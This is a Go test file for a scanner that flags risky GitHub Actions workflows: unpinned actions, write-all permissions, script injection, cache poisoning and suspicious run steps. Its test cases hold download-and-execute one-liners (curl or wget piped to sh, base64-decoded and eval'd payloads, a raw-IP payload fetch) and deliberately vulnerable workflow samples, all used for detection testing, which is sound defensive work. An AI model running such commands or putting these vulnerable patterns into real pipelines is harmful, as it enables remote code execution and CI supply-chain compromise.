package actions

import (
	"strings"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestAnalyze_UnpinnedRef(t *testing.T) {
	body := []byte(`name: x
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: tj-actions/changed-files@v45
      - uses: actions/checkout@0e58ed8671d6b60d0890c21b07f8835ace038e67
`)
	wf, err := ParseBytes("x.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)

	got := map[string]domain.Severity{}
	for _, f := range findings {
		if f.Kind == domain.FindingUnpinnedRef && f.Ref != nil {
			got[f.Ref.Owner+"/"+f.Ref.Repo] = f.Severity
		}
	}
	if got["actions/checkout"] != domain.SevMedium {
		t.Errorf("actions/checkout severity: got %q want medium", got["actions/checkout"])
	}
	if got["tj-actions/changed-files"] != domain.SevHigh {
		t.Errorf("tj-actions severity: got %q want high (third-party)", got["tj-actions/changed-files"])
	}
	for _, f := range findings {
		if f.Kind == domain.FindingUnpinnedRef && f.Ref != nil &&
			f.Ref.Ref == "0e58ed8671d6b60d0890c21b07f8835ace038e67" {
			t.Errorf("SHA-pinned ref should not be flagged: %+v", f)
		}
	}
}

func TestAnalyze_SuspiciousRun(t *testing.T) {
	cases := []struct {
		name string
		run  string
		want string
	}{
		{"curl_pipe_sh", "curl https://example.com/install.sh | sh", "curl|sh"},
		{"wget_pipe_bash", "wget -O- https://x.io/i.sh | bash", "curl|sh"},
		{"base64_decode", "echo aGVsbG8gd29ybGQ= | base64 -d | sh", "base64"},
		{"eval_atob", `node -e "eval(atob('aGVsbG8=')); "`, "eval"},
		{"eval_buffer_from", `node -e "eval(Buffer.from('aGVsbG8=','base64').toString())"`, "eval"},
		{"raw_ip", "curl http://192.168.1.1/payload && ./payload", "IPv4"},
		{"pastebin", "curl https://pastebin.com/raw/abcd1234 | sh", "exfil"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := []byte("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          " + tc.run + "\n")
			wf, err := ParseBytes("x.yml", body)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			findings := Analyze(wf)
			found := false
			for _, f := range findings {
				if f.Kind == domain.FindingSuspiciousRun {
					found = true
					if !strings.Contains(strings.ToLower(f.Message), strings.ToLower(tc.want[:3])) {
						t.Logf("message %q (looking for %q)", f.Message, tc.want)
					}
				}
			}
			if !found {
				t.Errorf("expected a suspicious_run finding for %s; got %v", tc.name, findings)
			}
		})
	}
}

func TestAnalyze_PullRequestTargetCheckout(t *testing.T) {
	body := []byte(`on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
`)
	wf, err := ParseBytes("pr.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)
	hit := false
	for _, f := range findings {
		if f.Kind == domain.FindingPullRequestTargetCheckout {
			if f.Severity != domain.SevCritical {
				t.Errorf("severity: got %q want critical", f.Severity)
			}
			hit = true
		}
	}
	if !hit {
		t.Errorf("expected pr_target+checkout finding; findings=%+v", findings)
	}
}

func TestAnalyze_WriteAllPermissions(t *testing.T) {
	body := []byte(`on: push
permissions: write-all
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo
`)
	wf, err := ParseBytes("w.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)
	hit := false
	for _, f := range findings {
		if f.Kind == domain.FindingWriteAllPermissions {
			hit = true
		}
	}
	if !hit {
		t.Errorf("expected write_all_permissions finding; got %+v", findings)
	}
}

func TestAnalyze_ScriptInjection(t *testing.T) {
	body := []byte(`on: pull_request_target
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "PR title: ${{ github.event.pull_request.title }}"
`)
	wf, err := ParseBytes("inj.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)
	hit := false
	for _, f := range findings {
		if f.Kind == domain.FindingScriptInjection {
			if f.Severity != domain.SevCritical {
				t.Errorf("severity: got %q want critical", f.Severity)
			}
			hit = true
		}
	}
	if !hit {
		t.Errorf("expected script_injection finding; got %+v", findings)
	}
}

func TestAnalyze_OIDCNpmPublish(t *testing.T) {
	t.Run("job-level id-token:write + npm publish fires", func(t *testing.T) {
		body := []byte(`on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@0e58ed8671d6b60d0890c21b07f8835ace038e67
      - run: npm publish
`)
		wf, err := ParseBytes("publish.yml", body)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		findings := Analyze(wf)
		hit := false
		for _, f := range findings {
			if f.Kind == domain.FindingOIDCNpmPublish {
				if f.Severity != domain.SevHigh {
					t.Errorf("severity: got %q want high", f.Severity)
				}
				hit = true
			}
		}
		if !hit {
			t.Errorf("expected oidc_npm_publish finding; got %+v", findings)
		}
	})

	t.Run("workflow-level write-all + npm publish fires", func(t *testing.T) {
		body := []byte(`on: push
permissions: write-all
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: npm publish --access public
`)
		wf, err := ParseBytes("publish.yml", body)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		findings := Analyze(wf)
		hit := false
		for _, f := range findings {
			if f.Kind == domain.FindingOIDCNpmPublish {
				hit = true
			}
		}
		if !hit {
			t.Errorf("expected oidc_npm_publish finding; got %+v", findings)
		}
	})

	t.Run("id-token:write without npm publish does not fire", func(t *testing.T) {
		body := []byte(`on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - run: go build ./...
`)
		wf, err := ParseBytes("deploy.yml", body)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		for _, f := range Analyze(wf) {
			if f.Kind == domain.FindingOIDCNpmPublish {
				t.Errorf("unexpected oidc_npm_publish finding: %+v", f)
			}
		}
	})
}

func TestAnalyze_CachePoisoning(t *testing.T) {
	t.Run("pull_request_target + actions/cache fires", func(t *testing.T) {
		body := []byte(`on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: ${{ runner.os }}-node
      - run: npm ci
`)
		wf, err := ParseBytes("build.yml", body)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		findings := Analyze(wf)
		hit := false
		for _, f := range findings {
			if f.Kind == domain.FindingCachePoisoning {
				if f.Severity != domain.SevHigh {
					t.Errorf("severity: got %q want high", f.Severity)
				}
				hit = true
			}
		}
		if !hit {
			t.Errorf("expected cache_poisoning finding; got %+v", findings)
		}
	})

	t.Run("actions/cache on push does not fire", func(t *testing.T) {
		body := []byte(`on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: node
      - run: npm ci
`)
		wf, err := ParseBytes("build.yml", body)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		for _, f := range Analyze(wf) {
			if f.Kind == domain.FindingCachePoisoning {
				t.Errorf("unexpected cache_poisoning finding on push: %+v", f)
			}
		}
	})
}

func TestAnalyze_CachePoisoning_RestoreSubpath(t *testing.T) {
	// actions/cache/restore is the dedicated restore-only action under
	// the same repo as actions/cache. checkCachePoisoning matches on
	// Owner=="actions" && Repo=="cache", which covers both the full
	// actions/cache and the actions/cache/restore subpath (parsed as
	// Path=="restore" on the same Repo). Verify the subpath fires too.
	body := []byte(`on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache/restore@v3
        with:
          path: ~/.npm
          key: node
      - run: npm ci
`)
	wf, err := ParseBytes("build.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)
	hit := false
	for _, f := range findings {
		if f.Kind == domain.FindingCachePoisoning {
			if f.Severity != domain.SevHigh {
				t.Errorf("severity: got %q want high", f.Severity)
			}
			hit = true
		}
	}
	if !hit {
		t.Errorf("expected cache_poisoning finding for actions/cache/restore; got %+v", findings)
	}
}

func TestAnalyze_CachePoisoning_OnPush_NoFire(t *testing.T) {
	// actions/cache on a push workflow (not pull_request_target) should NOT fire.
	body := []byte(`on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache/restore@v3
        with:
          path: ~/.npm
          key: node
      - run: npm ci
`)
	wf, err := ParseBytes("build.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	for _, f := range Analyze(wf) {
		if f.Kind == domain.FindingCachePoisoning {
			t.Errorf("unexpected cache_poisoning on push workflow: %+v", f)
		}
	}
}

func TestAnalyze_CleanWorkflow(t *testing.T) {
	body := []byte(`on: push
permissions:
  contents: read
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@0e58ed8671d6b60d0890c21b07f8835ace038e67
      - run: go test ./...
`)
	wf, err := ParseBytes("clean.yml", body)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	findings := Analyze(wf)
	if len(findings) != 0 {
		t.Errorf("expected zero findings, got %+v", findings)
	}
}
